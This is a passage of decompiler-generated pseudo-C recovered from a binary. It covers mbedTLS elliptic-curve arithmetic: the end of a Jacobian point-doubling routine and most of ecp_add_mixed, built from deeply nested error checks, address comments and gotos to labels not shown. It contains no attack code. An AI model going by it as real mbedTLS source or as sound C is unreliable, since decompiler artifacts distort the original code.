                                                                                                                                    g6 = v9;
                                                                                                                                    g1 = result;
                                                                                                                                    v34 = ecp_modp(result, v12);
                                                                                                                                    g1 = v34;
                                                                                                                                    if (v34 == 0) {
                                                                                                                                        // 0x805cbac
                                                                                                                                        g216++;
                                                                                                                                        v35 = mbedtls_mpi_shift_l(result, 1);
                                                                                                                                        g1 = v35;
                                                                                                                                        if (v35 == 0) {
                                                                                                                                            while (true) {
                                                                                                                                                // 0x805cbce
                                                                                                                                                v36 = mbedtls_mpi_cmp_mpi(&v11, v41);
                                                                                                                                                g1 = v36;
                                                                                                                                                if (v36 >= 0) {
                                                                                                                                                    goto lab_0x805cbe4_2;
                                                                                                                                                }
                                                                                                                                                // 0x805cc03
                                                                                                                                                v37 = mbedtls_mpi_copy((char *)v8, (int32_t *)g5);
                                                                                                                                                g1 = v37;
                                                                                                                                                if (v37 == 0) {
                                                                                                                                                    // 0x805cc1a
                                                                                                                                                    v13 = v8 + 12;
                                                                                                                                                    g1 = v13;
                                                                                                                                                    v38 = mbedtls_mpi_copy((char *)v13, (int32_t *)g3);
                                                                                                                                                    g1 = v38;
                                                                                                                                                    if (v38 == 0) {
                                                                                                                                                        // 0x805cc34
                                                                                                                                                        v14 = v8 + 24;
                                                                                                                                                        g1 = v14;
                                                                                                                                                        v39 = mbedtls_mpi_copy((char *)v14, &v11);
                                                                                                                                                        g1 = v39;
                                                                                                                                                        // branch -> 0x805c53a
                                                                                                                                                        // 0x805c53a
                                                                                                                                                        g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                                                                                                        g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                                                                                                        g1 = mbedtls_mpi_free((int32_t *)g5);
                                                                                                                                                        mbedtls_mpi_free(&v11);
                                                                                                                                                        g1 = v39;
                                                                                                                                                        g3 = v2;
                                                                                                                                                        g7 = v1;
                                                                                                                                                        return result;
                                                                                                                                                    }
                                                                                                                                                    v24 = v38;
                                                                                                                                                } else {
                                                                                                                                                    v24 = v37;
                                                                                                                                                }
                                                                                                                                            }
                                                                                                                                            // 0x805c53a
                                                                                                                                            g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                                                                                            g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                                                                                            g1 = mbedtls_mpi_free((int32_t *)g5);
                                                                                                                                            mbedtls_mpi_free(&v11);
                                                                                                                                            g1 = v24;
                                                                                                                                            g3 = v2;
                                                                                                                                            g7 = v1;
                                                                                                                                            return result;
                                                                                                                                        }
                                                                                                                                        v24 = v35;
                                                                                                                                    } else {
                                                                                                                                        v24 = v34;
                                                                                                                                    }
                                                                                                                                } else {
                                                                                                                                    v24 = v33;
                                                                                                                                }
                                                                                                                            }
                                                                                                                        } else {
                                                                                                                            v24 = v32;
                                                                                                                        }
                                                                                                                    } else {
                                                                                                                        v24 = v31;
                                                                                                                    }
                                                                                                                } else {
                                                                                                                    v24 = v30;
                                                                                                                }
                                                                                                            }
                                                                                                        } else {
                                                                                                            v24 = v29;
                                                                                                        }
                                                                                                    }
                                                                                                } else {
                                                                                                    v24 = v28;
                                                                                                }
                                                                                            }
                                                                                        } else {
                                                                                            v24 = v27;
                                                                                        }
                                                                                    } else {
                                                                                        v24 = v26;
                                                                                    }
                                                                                } else {
                                                                                    v24 = v25;
                                                                                }
                                                                            }
                                                                        } else {
                                                                            v24 = v23;
                                                                        }
                                                                    } else {
                                                                        v24 = v22;
                                                                    }
                                                                } else {
                                                                    v24 = v21;
                                                                }
                                                            }
                                                        } else {
                                                            v24 = v20;
                                                        }
                                                    } else {
                                                        v24 = v19;
                                                    }
                                                } else {
                                                    v24 = v18;
                                                }
                                            }
                                        } else {
                                            v24 = v17;
                                        }
                                    } else {
                                        v24 = v16;
                                    }
                                } else {
                                    v24 = v15;
                                }
                            } else {
                                int32_t v97 = g3; // 0x805c8f3
                                int32_t v98 = v10 + 24; // 0x805c8f6
                                int32_t * v99 = (int32_t *)v98;
                                int32_t v100 = mbedtls_mpi_mul_mpi((int32_t *)v97, v99, v99); // 0x805c901
                                g1 = v100;
                                if (v100 == 0) {
                                    // 0x805c90e
                                    g6 = v9;
                                    g1 = v5;
                                    int32_t v101 = ecp_modp(v97, v98); // 0x805c913
                                    g1 = v101;
                                    if (v101 == 0) {
                                        // 0x805c920
                                        g216++;
                                        int32_t v102 = g3; // 0x805c927
                                        int32_t v103 = g5; // 0x805c92f
                                        int32_t * v104 = (int32_t *)v102;
                                        int32_t v105 = mbedtls_mpi_mul_mpi((int32_t *)v103, v104, v104); // 0x805c932
                                        g1 = v105;
                                        if (v105 == 0) {
                                            // 0x805c93f
                                            g6 = v9;
                                            g1 = v7;
                                            int32_t v106 = ecp_modp(v103, v102); // 0x805c944
                                            g1 = v106;
                                            if (v106 == 0) {
                                                // 0x805c951
                                                g216++;
                                                int32_t v107 = g5; // 0x805c95b
                                                int32_t v108 = g3; // 0x805c963
                                                int32_t v109 = mbedtls_mpi_mul_mpi((int32_t *)v108, (int32_t *)v107, (int32_t *)v96); // 0x805c966
                                                g1 = v109;
                                                if (v109 == 0) {
                                                    // 0x805c973
                                                    g6 = v9;
                                                    g1 = v5;
                                                    int32_t v110 = ecp_modp(v108, v107); // 0x805c978
                                                    g1 = v110;
                                                    if (v110 == 0) {
                                                        // 0x805c985
                                                        g216++;
                                                        int32_t * v111 = (int32_t *)g7;
                                                        int32_t v112 = mbedtls_mpi_add_mpi(v111, v111, (int32_t *)g3); // 0x805c997
                                                        g1 = v112;
                                                        if (v112 == 0) {
                                                            while (true) {
                                                                // 0x805c9c0
                                                                if (mbedtls_mpi_cmp_mpi((int32_t *)g7, v95) > 0) {
                                                                    int32_t v113 = g7; // 0x805c9a8
                                                                    int32_t v114 = mbedtls_mpi_sub_abs((int32_t *)v113, v113, v94); // 0x805c9b3
                                                                    g1 = v114;
                                                                    if (v114 != 0) {
                                                                        v24 = v114;
                                                                        // break -> 0x805c53a
                                                                        break;
                                                                    }
                                                                    // continue -> 0x805c9c0
                                                                    continue;
                                                                } else {
                                                                    v55 = v94;
                                                                    // 0x805c5f7
                                                                    v49 = g5;
                                                                    v12 = v10 + 12;
                                                                    v40 = (int32_t *)v12;
                                                                    v15 = mbedtls_mpi_mul_mpi((int32_t *)v49, v40, v40);
                                                                    g1 = v15;
                                                                    if (v15 == 0) {
                                                                        // 0x805c618
                                                                        g6 = v9;
                                                                        g1 = v7;
                                                                        v16 = ecp_modp(v49, v12);
                                                                        g1 = v16;
                                                                        if (v16 == 0) {
                                                                            // 0x805c62a
                                                                            g216++;
                                                                            v17 = mbedtls_mpi_shift_l(g5, 1);
                                                                            g1 = v17;
                                                                            if (v17 == 0) {
                                                                                // 0x805c665
                                                                                v41 = (int32_t *)v55;
                                                                                // branch -> 0x805c665
                                                                                while (true) {
                                                                                    // 0x805c665
                                                                                    if (mbedtls_mpi_cmp_mpi((int32_t *)g5, v41) >= 0) {
                                                                                        goto lab_0x805c64a_2;
                                                                                    }
                                                                                    // 0x805c678
                                                                                    v50 = g3;
                                                                                    v18 = mbedtls_mpi_mul_mpi((int32_t *)v50, (int32_t *)v10, (int32_t *)g5);
                                                                                    g1 = v18;
                                                                                    if (v18 == 0) {
                                                                                        // 0x805c693
                                                                                        g6 = v9;
                                                                                        g1 = v5;
                                                                                        v19 = ecp_modp(v50, v10);
                                                                                        g1 = v19;
                                                                                        if (v19 == 0) {
                                                                                            // 0x805c6a5
                                                                                            g216++;
                                                                                            v20 = mbedtls_mpi_shift_l(g3, 1);
                                                                                            g1 = v20;
                                                                                            if (v20 == 0) {
                                                                                                while (true) {
                                                                                                    // 0x805c6e0
                                                                                                    if (mbedtls_mpi_cmp_mpi((int32_t *)g3, v41) > 0) {
                                                                                                        goto lab_0x805c6c5_2;
                                                                                                    }
                                                                                                    // 0x805c6f3
                                                                                                    v52 = g5;
                                                                                                    v42 = (int32_t *)v52;
                                                                                                    v21 = mbedtls_mpi_mul_mpi(&v11, v42, v42);
                                                                                                    g1 = v21;
                                                                                                    if (v21 == 0) {
                                                                                                        // 0x805c70e
                                                                                                        g6 = v9;
                                                                                                        g1 = result;
                                                                                                        v22 = ecp_modp(result, v52);
                                                                                                        g1 = v22;
                                                                                                        if (v22 == 0) {
                                                                                                            // 0x805c721
                                                                                                            g216++;
                                                                                                            v23 = mbedtls_mpi_shift_l(result, 1);
                                                                                                            g1 = v23;
                                                                                                            if (v23 == 0) {
                                                                                                                while (true) {
                                                                                                                    // 0x805c743
                                                                                                                    if (mbedtls_mpi_cmp_mpi(&v11, v41) >= 0) {
                                                                                                                        goto lab_0x805c75d_2;
                                                                                                                    }
                                                                                                                    // 0x805c9d8
                                                                                                                    v53 = g7;
                                                                                                                    v51 = g5;
                                                                                                                    v43 = (int32_t *)v53;
                                                                                                                    v25 = mbedtls_mpi_mul_mpi((int32_t *)v51, v43, v43);
                                                                                                                    g1 = v25;
                                                                                                                    if (v25 == 0) {
                                                                                                                        // 0x805c9f0
                                                                                                                        g6 = v9;
                                                                                                                        g1 = v7;
                                                                                                                        v26 = ecp_modp(v51, v53);
                                                                                                                        g1 = v26;
                                                                                                                        if (v26 == 0) {
                                                                                                                            // 0x805ca02
                                                                                                                            g216++;
                                                                                                                            v44 = (int32_t *)g5;
                                                                                                                            v27 = mbedtls_mpi_sub_mpi(v44, v44, (int32_t *)g3);
                                                                                                                            g1 = v27;
                                                                                                                            if (v27 == 0) {
                                                                                                                                while (true) {
                                                                                                                                    // 0x805ca21
                                                                                                                                    if (v6 <= 0) {
                                                                                                                                        goto lab_0x805ca27_2;
                                                                                                                                    }
                                                                                                                                    // 0x805ca57
                                                                                                                                    v45 = (int32_t *)g5;
                                                                                                                                    v28 = mbedtls_mpi_sub_mpi(v45, v45, (int32_t *)g3);
                                                                                                                                    g1 = v28;
                                                                                                                                    if (v28 == 0) {
                                                                                                                                        while (true) {
                                                                                                                                            // 0x805ca6f
                                                                                                                                            if (v6 <= 0) {
                                                                                                                                                goto lab_0x805ca75_2;
                                                                                                                                            }
                                                                                                                                            // 0x805caa5
                                                                                                                                            v46 = (int32_t *)g3;
                                                                                                                                            v29 = mbedtls_mpi_sub_mpi(v46, v46, (int32_t *)g5);
                                                                                                                                            g1 = v29;
                                                                                                                                            if (v29 == 0) {
                                                                                                                                                while (true) {
                                                                                                                                                    // 0x805cabd
                                                                                                                                                    if (v4 <= 0) {
                                                                                                                                                        goto lab_0x805cac3_2;
                                                                                                                                                    }
                                                                                                                                                    // 0x805caf3
                                                                                                                                                    v54 = g3;
                                                                                                                                                    v47 = (int32_t *)v54;
                                                                                                                                                    v30 = mbedtls_mpi_mul_mpi(v47, v47, (int32_t *)g7);
                                                                                                                                                    g1 = v30;
                                                                                                                                                    if (v30 == 0) {
                                                                                                                                                        // 0x805cb0b
                                                                                                                                                        g6 = v9;
                                                                                                                                                        g1 = v5;
                                                                                                                                                        v31 = ecp_modp(v54, v54);
                                                                                                                                                        g1 = v31;
                                                                                                                                                        if (v31 == 0) {
                                                                                                                                                            // 0x805cb1d
                                                                                                                                                            g216++;
                                                                                                                                                            v48 = (int32_t *)g3;
                                                                                                                                                            v32 = mbedtls_mpi_sub_mpi(v48, v48, &v11);
                                                                                                                                                            g1 = v32;
                                                                                                                                                            if (v32 == 0) {
                                                                                                                                                                while (true) {
                                                                                                                                                                    // 0x805cb3f
                                                                                                                                                                    if (v4 <= 0) {
                                                                                                                                                                        goto lab_0x805cb45_2;
                                                                                                                                                                    }
                                                                                                                                                                    // 0x805cb75
                                                                                                                                                                    v33 = mbedtls_mpi_mul_mpi(&v11, v40, (int32_t *)(v10 + 24));
                                                                                                                                                                    g1 = v33;
                                                                                                                                                                    if (v33 == 0) {
                                                                                                                                                                        // 0x805cb99
                                                                                                                                                                        g6 = v9;
                                                                                                                                                                        g1 = result;
                                                                                                                                                                        v34 = ecp_modp(result, v12);
                                                                                                                                                                        g1 = v34;
                                                                                                                                                                        if (v34 == 0) {
                                                                                                                                                                            // 0x805cbac
                                                                                                                                                                            g216++;
                                                                                                                                                                            v35 = mbedtls_mpi_shift_l(result, 1);
                                                                                                                                                                            g1 = v35;
                                                                                                                                                                            if (v35 == 0) {
                                                                                                                                                                                while (true) {
                                                                                                                                                                                    // 0x805cbce
                                                                                                                                                                                    v36 = mbedtls_mpi_cmp_mpi(&v11, v41);
                                                                                                                                                                                    g1 = v36;
                                                                                                                                                                                    if (v36 >= 0) {
                                                                                                                                                                                        goto lab_0x805cbe4_2;
                                                                                                                                                                                    }
                                                                                                                                                                                    // 0x805cc03
                                                                                                                                                                                    v37 = mbedtls_mpi_copy((char *)v8, (int32_t *)g5);
                                                                                                                                                                                    g1 = v37;
                                                                                                                                                                                    if (v37 == 0) {
                                                                                                                                                                                        // 0x805cc1a
                                                                                                                                                                                        v13 = v8 + 12;
                                                                                                                                                                                        g1 = v13;
                                                                                                                                                                                        v38 = mbedtls_mpi_copy((char *)v13, (int32_t *)g3);
                                                                                                                                                                                        g1 = v38;
                                                                                                                                                                                        if (v38 == 0) {
                                                                                                                                                                                            // 0x805cc34
                                                                                                                                                                                            v14 = v8 + 24;
                                                                                                                                                                                            g1 = v14;
                                                                                                                                                                                            v39 = mbedtls_mpi_copy((char *)v14, &v11);
                                                                                                                                                                                            g1 = v39;
                                                                                                                                                                                            // branch -> 0x805c53a
                                                                                                                                                                                            // 0x805c53a
                                                                                                                                                                                            g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                                                                                                                                            g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                                                                                                                                            g1 = mbedtls_mpi_free((int32_t *)g5);
                                                                                                                                                                                            mbedtls_mpi_free(&v11);
                                                                                                                                                                                            g1 = v39;
                                                                                                                                                                                            g3 = v2;
                                                                                                                                                                                            g7 = v1;
                                                                                                                                                                                            return result;
                                                                                                                                                                                        }
                                                                                                                                                                                        v24 = v38;
                                                                                                                                                                                    } else {
                                                                                                                                                                                        v24 = v37;
                                                                                                                                                                                    }
                                                                                                                                                                                }
                                                                                                                                                                                // 0x805c53a
                                                                                                                                                                                g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                                                                                                                                g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                                                                                                                                g1 = mbedtls_mpi_free((int32_t *)g5);
                                                                                                                                                                                mbedtls_mpi_free(&v11);
                                                                                                                                                                                g1 = v24;
                                                                                                                                                                                g3 = v2;
                                                                                                                                                                                g7 = v1;
                                                                                                                                                                                return result;
                                                                                                                                                                            }
                                                                                                                                                                            v24 = v35;
                                                                                                                                                                        } else {
                                                                                                                                                                            v24 = v34;
                                                                                                                                                                        }
                                                                                                                                                                    } else {
                                                                                                                                                                        v24 = v33;
                                                                                                                                                                    }
                                                                                                                                                                }
                                                                                                                                                            } else {
                                                                                                                                                                v24 = v32;
                                                                                                                                                            }
                                                                                                                                                        } else {
                                                                                                                                                            v24 = v31;
                                                                                                                                                        }
                                                                                                                                                    } else {
                                                                                                                                                        v24 = v30;
                                                                                                                                                    }
                                                                                                                                                }
                                                                                                                                            } else {
                                                                                                                                                v24 = v29;
                                                                                                                                            }
                                                                                                                                        }
                                                                                                                                    } else {
                                                                                                                                        v24 = v28;
                                                                                                                                    }
                                                                                                                                }
                                                                                                                            } else {
                                                                                                                                v24 = v27;
                                                                                                                            }
                                                                                                                        } else {
                                                                                                                            v24 = v26;
                                                                                                                        }
                                                                                                                    } else {
                                                                                                                        v24 = v25;
                                                                                                                    }
                                                                                                                }
                                                                                                            } else {
                                                                                                                v24 = v23;
                                                                                                            }
                                                                                                        } else {
                                                                                                            v24 = v22;
                                                                                                        }
                                                                                                    } else {
                                                                                                        v24 = v21;
                                                                                                    }
                                                                                                }
                                                                                            } else {
                                                                                                v24 = v20;
                                                                                            }
                                                                                        } else {
                                                                                            v24 = v19;
                                                                                        }
                                                                                    } else {
                                                                                        v24 = v18;
                                                                                    }
                                                                                }
                                                                            } else {
                                                                                v24 = v17;
                                                                            }
                                                                        } else {
                                                                            v24 = v16;
                                                                        }
                                                                    } else {
                                                                        v24 = v15;
                                                                    }
                                                                }
                                                                // 0x805c53a
                                                                g1 = mbedtls_mpi_free((int32_t *)g7);
                                                                g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                g1 = mbedtls_mpi_free((int32_t *)g5);
                                                                mbedtls_mpi_free(&v11);
                                                                g1 = v24;
                                                                g3 = v2;
                                                                g7 = v1;
                                                                return result;
                                                            }
                                                        } else {
                                                            v24 = v112;
                                                        }
                                                    } else {
                                                        v24 = v110;
                                                    }
                                                } else {
                                                    v24 = v109;
                                                }
                                            } else {
                                                v24 = v106;
                                            }
                                        } else {
                                            v24 = v105;
                                        }
                                    } else {
                                        v24 = v101;
                                    }
                                } else {
                                    v24 = v100;
                                }
                            }
                            // 0x805c53a
                            g1 = mbedtls_mpi_free((int32_t *)g7);
                            g1 = mbedtls_mpi_free((int32_t *)g3);
                            g1 = mbedtls_mpi_free((int32_t *)g5);
                            mbedtls_mpi_free(&v11);
                            g1 = v24;
                            g3 = v2;
                            g7 = v1;
                            return result;
                        }
                        int32_t v115 = g7; // 0x805c5ab
                        int32_t v116 = mbedtls_mpi_sub_abs((int32_t *)v115, v115, v94); // 0x805c5b6
                        g1 = v116;
                        if (v116 != 0) {
                            v24 = v116;
                            // break -> 0x805c53a
                            break;
                        }
                        // continue -> 0x805c5c3
                    }
                } else {
                    v24 = v93;
                }
            } else {
                v24 = v92;
            }
        } else {
            v24 = v91;
        }
    }
    // 0x805c53a
    g1 = mbedtls_mpi_free((int32_t *)g7);
    g1 = mbedtls_mpi_free((int32_t *)g3);
    g1 = mbedtls_mpi_free((int32_t *)g5);
    mbedtls_mpi_free(&v11);
    g1 = v24;
    g3 = v2;
    g7 = v1;
    return result;
}

// Address range: 0x805cc50 - 0x805d36f
int32_t ecp_add_mixed(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
    int32_t v1 = g5; // 0x805cc53
    int32_t v2 = g4; // 0x805cc54
    g5 = v2;
    int32_t v3 = g7; // 0x805cc56
    int32_t v4 = g3; // 0x805cc57
    int32_t v5 = v2 + 24; // 0x805cc5e
    g7 = v5;
    g214++;
    int32_t v6 = g1; // 0x805cc68
    int32_t v7 = g6; // 0x805cc6e
    g1 = a1;
    int32_t v8;
    if (mbedtls_mpi_cmp_int(v5, 0) == 0) {
        int32_t result = mbedtls_ecp_copy(v7, a1); // 0x805cd95
        g1 = result;
        g3 = v4;
        g7 = v3;
        g5 = v1;
        g2 = v8;
        return result;
    }
    // 0x805cc89
    int32_t v9; // 0x805ce8f
    int32_t v10; // 0x805d335
    int32_t v11; // 0x805d352
    int32_t v12; // 0x805ccbe_0
    int32_t v13; // 0x805ccc9_0
    int32_t v14; // 0x805ccd4_0
    int32_t v15; // 0x805ccdf_0
    int32_t v16; // 0x805ccea_0
    int32_t v17; // 0x805cd00_0
    int32_t v18; // 0x805cd16
    int32_t v19; // 0x805cdb0
    int32_t v20; // 0x805cdd2
    int32_t v21; // 0x805cde8
    int32_t v22; // 0x805ce0a
    int32_t v23; // 0x805ce1f
    int32_t v24; // 0x805ce47
    int32_t v25; // 0x805ce5d
    int32_t v26; // 0x805ce7c
    int32_t v27; // 0x805cee3
    int32_t v28; // 0x805cf94
    int32_t v29; // 0x805cfc4
    int32_t v30; // 0x805cfda
    int32_t v31; // 0x805cffc
    int32_t v32; // 0x805d012
    int32_t v33; // 0x805d037
    int32_t v34; // 0x805d04d
    int32_t v35; // 0x805d06f
    int32_t v36; // 0x805d085
    int32_t v37; // 0x805d0ab
    int32_t v38; // 0x805d0d6
    int32_t v39; // 0x805d0ea
    int32_t v40; // 0x805d106
    int32_t v41; // 0x805d11c
    int32_t v42; // 0x805d13e
    int32_t v43; // 0x805d198
    int32_t v44; // 0x805d1f2
    int32_t v45; // 0x805d24c
    int32_t v46; // 0x805d262
    int32_t v47; // 0x805d28a
    int32_t v48; // 0x805d2a0
    int32_t v49; // 0x805d2c8
    int32_t v50; // 0x805d31e
    int32_t v51; // 0x805d33b
    int32_t v52; // 0x805d358
    int32_t v53;
    int32_t v54;
    int32_t v55;
    int32_t v56;
    int32_t v57;
    int32_t v58;
    int32_t v59;
    int32_t * v60;
    int32_t * v61;
    int32_t * v62;
    int32_t * v63;
    int32_t * v64;
    int32_t * v65;
    int32_t v66; // 0x805cd13
    int32_t result3; // 0x805cd23
    int32_t v67; // 0x805cd0b
    int32_t v68; // 0x805cdcb
    int32_t v69; // 0x805cdff
    int32_t v70; // 0x805cfbd
    int32_t v71; // 0x805cff1
    int32_t v72; // 0x805d0cf
    if (*(int32_t *)(a1 + 32) != 0) {
        int32_t v73 = a1 + 24; // 0x805cc95
        g3 = v73;
        int32_t v74 = mbedtls_mpi_cmp_int(v73, 0); // 0x805cca3
        g1 = v74;
        if (v74 == 0) {
            int32_t result2 = mbedtls_ecp_copy(v7, g5); // 0x805cf62
            g1 = result2;
            g3 = v4;
            g7 = v3;
            g5 = v1;
            g2 = v8;
            return result2;
        }
        int32_t v75 = *(int32_t *)(a1 + 32); // 0x805ccb3
        g4 = v75;
        if (v75 == 0) {
            // 0x805ccbe
            v12 = &v55;
            g3 = v12;
            mbedtls_mpi_init(&v55);
            v13 = &v56;
            mbedtls_mpi_init(&v56);
            v14 = &v57;
            mbedtls_mpi_init(&v57);
            v15 = &v58;
            mbedtls_mpi_init(&v58);
            v16 = &v59;
            mbedtls_mpi_init(&v59);
            mbedtls_mpi_init(&v53);
            v17 = &v54;
            mbedtls_mpi_init(&v54);
            v67 = g7;
            v66 = g3;
            v64 = (int32_t *)v67;
            v18 = mbedtls_mpi_mul_mpi((int32_t *)v66, v64, v64);
            g1 = v18;
            result3 = v18;
            if (v18 == 0) {
                // 0x805cda8
                g6 = v6;
                g1 = v12;
                v19 = ecp_modp(v66, v67);
                g1 = v19;
                if (v19 == 0) {
                    // 0x805cdbd
                    g216++;
                    v68 = g3;
                    v20 = mbedtls_mpi_mul_mpi(&v56, (int32_t *)v68, (int32_t *)g7);
                    g1 = v20;
                    if (v20 == 0) {
                        // 0x805cddf
                        g6 = v6;
                        g1 = v13;
                        v21 = ecp_modp(v13, v68);
                        g1 = v21;
                        if (v21 == 0) {
                            // 0x805cdf5
                            g216++;
                            v69 = g3;
                            v65 = (int32_t *)v69;
                            v22 = mbedtls_mpi_mul_mpi(v65, v65, (int32_t *)a1);
                            g1 = v22;
                            if (v22 == 0) {
                                // 0x805ce17
                                g6 = v6;
                                g1 = v12;
                                v23 = ecp_modp(v69, v69);
                                g1 = v23;
                                if (v23 == 0) {
                                    // 0x805ce2c
                                    g216++;
                                    v24 = mbedtls_mpi_mul_mpi(&v56, &v56, (int32_t *)(a1 + 12));
                                    g1 = v24;
                                    if (v24 == 0) {
                                        // 0x805ce54
                                        g6 = v6;
                                        g1 = v13;
                                        v25 = ecp_modp(v13, v13);
                                        g1 = v25;
                                        if (v25 == 0) {
                                            // 0x805ce6a
                                            g216++;
                                            v60 = (int32_t *)g3;
                                            v26 = mbedtls_mpi_sub_mpi(v60, v60, (int32_t *)g5);
                                            g1 = v26;
                                            if (v26 == 0) {
                                                // 0x805ce89
                                                v9 = v6 + 4;
                                                v61 = (int32_t *)v9;
                                                // branch -> 0x805cec6
                                                while (true) {
                                                    // 0x805cec6
                                                    if (v55 < 0) {
                                                        goto lab_0x805ce97_2;
                                                    }
                                                    // 0x805cecc
                                                    v62 = (int32_t *)(g5 + 12);
                                                    v27 = mbedtls_mpi_sub_mpi(&v56, &v56, v62);
                                                    g1 = v27;
                                                    if (v27 == 0) {
                                                        while (true) {
                                                            // 0x805cef0
                                                            if (v56 <= 0) {
                                                                goto lab_0x805cef6_2;
                                                            }
                                                            // 0x805cf72
                                                            if (mbedtls_mpi_cmp_int(g3, 0) == 0) {
                                                                // 0x805cf86
                                                                v28 = mbedtls_mpi_cmp_int(v13, 0);
                                                                g6 = v7;
                                                                if (v28 != 0) {
                                                                    // 0x805d0e4
                                                                    v39 = mbedtls_ecp_set_zero(v7);
                                                                    g1 = v39;
                                                                    result3 = v39;
                                                                    // branch -> 0x805cd23
                                                                    // 0x805cd23
                                                                    g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                    g1 = mbedtls_mpi_free(&v56);
                                                                    g1 = mbedtls_mpi_free(&v57);
                                                                    g1 = mbedtls_mpi_free(&v58);
                                                                    g1 = mbedtls_mpi_free(&v59);
                                                                    g1 = mbedtls_mpi_free(&v53);
                                                                    mbedtls_mpi_free(&v54);
                                                                    g1 = result3;
                                                                    // branch -> 0x805cd79
                                                                    // 0x805cd79
                                                                    g3 = v4;
                                                                    g7 = v3;
                                                                    g5 = v1;
                                                                    g2 = v8;
                                                                    return result3;
                                                                }
                                                                // 0x805cfa1
                                                                g4 = g5;
                                                                g1 = v6;
                                                                ecp_double_jac(v13, 0);
                                                                result3 = g1;
                                                                // branch -> 0x805cd23
                                                                // 0x805cd23
                                                                g1 = mbedtls_mpi_free((int32_t *)g3);
                                                                g1 = mbedtls_mpi_free(&v56);
                                                                g1 = mbedtls_mpi_free(&v57);
                                                                g1 = mbedtls_mpi_free(&v58);
                                                                g1 = mbedtls_mpi_free(&v59);
                                                                g1 = mbedtls_mpi_free(&v53);
                                                                mbedtls_mpi_free(&v54);
                                                                g1 = result3;
                                                                // branch -> 0x805cd79
                                                                // 0x805cd79
                                                                g3 = v4;
                                                                g7 = v3;
                                                                g5 = v1;
                                                                g2 = v8;
                                                                return result3;
                                                            }
                                                            // 0x805cfb6
                                                            v70 = g7;
                                                            v29 = mbedtls_mpi_mul_mpi(&v54, (int32_t *)v70, (int32_t *)g3);
                                                            g1 = v29;
                                                            if (v29 == 0) {
                                                                // 0x805cfd1
                                                                g6 = v6;
                                                                g1 = v17;
                                                                v30 = ecp_modp(v17, v70);
                                                                g1 = v30;
                                                                if (v30 == 0) {
                                                                    // 0x805cfe7
                                                                    g216++;
                                                                    v71 = g3;
                                                                    v63 = (int32_t *)v71;
                                                                    v31 = mbedtls_mpi_mul_mpi(&v57, v63, v63);
                                                                    g1 = v31;
                                                                    if (v31 == 0) {
                                                                        // 0x805d009
                                                                        g6 = v6;
                                                                        g1 = v14;
                                                                        v32 = ecp_modp(v14, v71);
                                                                        g1 = v32;
                                                                        if (v32 == 0) {
                                                                            // 0x805d01f
                                                                            g216++;
                                                                            v33 = mbedtls_mpi_mul_mpi(&v58, &v57, (int32_t *)g3);
                                                                            g1 = v33;
                                                                            if (v33 == 0) {
                                                                                // 0x805d044
                                                                                g6 = v6;
                                                                                g1 = v15;
                                                                                v34 = ecp_modp(v15, v14);
                                                                                g1 = v34;
                                                                                if (v34 == 0) {
                                                                                    // 0x805d05a
                                                                                    g216++;
                                                                                    v35 = mbedtls_mpi_mul_mpi(&v57, &v57, (int32_t *)g5);
                                                                                    g1 = v35;
                                                                                    if (v35 == 0) {
                                                                                        // 0x805d07c
                                                                                        g6 = v6;
                                                                                        g1 = v14;
                                                                                        v36 = ecp_modp(v14, v14);
                                                                                        g1 = v36;
                                                                                        if (v36 == 0) {
                                                                                            // 0x805d092
                                                                                            g216++;
                                                                                            v37 = mbedtls_mpi_mul_int(g3, v14, 2);
                                                                                            g1 = v37;
                                                                                            if (v37 == 0) {
                                                                                                // 0x805d0b8
                                                                                                g7 = v9;
                                                                                                if (mbedtls_mpi_cmp_mpi((int32_t *)g3, v61) < 0) {
                                                                                                    // 0x805d0f5
                                                                                                    v40 = mbedtls_mpi_mul_mpi(&v59, &v56, &v56);
                                                                                                    g1 = v40;
                                                                                                    if (v40 == 0) {
                                                                                                        // 0x805d113
                                                                                                        g6 = v6;
                                                                                                        g1 = v16;
                                                                                                        v41 = ecp_modp(v16, v13);
                                                                                                        g1 = v41;
                                                                                                        if (v41 == 0) {
                                                                                                            // 0x805d129
                                                                                                            g216++;
                                                                                                            v42 = mbedtls_mpi_sub_mpi(&v59, &v59, (int32_t *)g3);
                                                                                                            g1 = v42;
                                                                                                            if (v42 == 0) {
                                                                                                                while (true) {
                                                                                                                    // 0x805d14b
                                                                                                                    if (v59 <= 0) {
                                                                                                                        goto lab_0x805d151_3;
                                                                                                                    }
                                                                                                                    // 0x805d187
                                                                                                                    v43 = mbedtls_mpi_sub_mpi(&v59, &v59, &v58);
                                                                                                                    g1 = v43;
                                                                                                                    if (v43 == 0) {
                                                                                                                        while (true) {
                                                                                                                            // 0x805d1a5
                                                                                                                            if (v59 <= 0) {
                                                                                                                                goto lab_0x805d1ab_3;
                                                                                                                            }
                                                                                                                            // 0x805d1e1
                                                                                                                            v44 = mbedtls_mpi_sub_mpi(&v57, &v57, &v59);
                                                                                                                            g1 = v44;
                                                                                                                            if (v44 == 0) {
                                                                                                                                while (true) {
                                                                                                                                    // 0x805d1ff
                                                                                                                                    if (v57 <= 0) {
                                                                                                                                        goto lab_0x805d205_3;
                                                                                                                                    }
                                                                                                                                    // 0x805d23b
                                                                                                                                    v45 = mbedtls_mpi_mul_mpi(&v57, &v57, &v56);
                                                                                                                                    g1 = v45;
                                                                                                                                    if (v45 == 0) {
                                                                                                                                        // 0x805d259
                                                                                                                                        g6 = v6;
                                                                                                                                        g1 = v14;
                                                                                                                                        v46 = ecp_modp(v14, v14);
                                                                                                                                        g1 = v46;
                                                                                                                                        if (v46 == 0) {
                                                                                                                                            // 0x805d26f
                                                                                                                                            g216++;
                                                                                                                                            v47 = mbedtls_mpi_mul_mpi(&v58, &v58, v62);
                                                                                                                                            g1 = v47;
                                                                                                                                            if (v47 == 0) {
                                                                                                                                                // 0x805d297
                                                                                                                                                g6 = v6;
                                                                                                                                                g1 = v15;
                                                                                                                                                v48 = ecp_modp(v15, v15);
                                                                                                                                                g1 = v48;
                                                                                                                                                if (v48 == 0) {
                                                                                                                                                    // 0x805d2ad
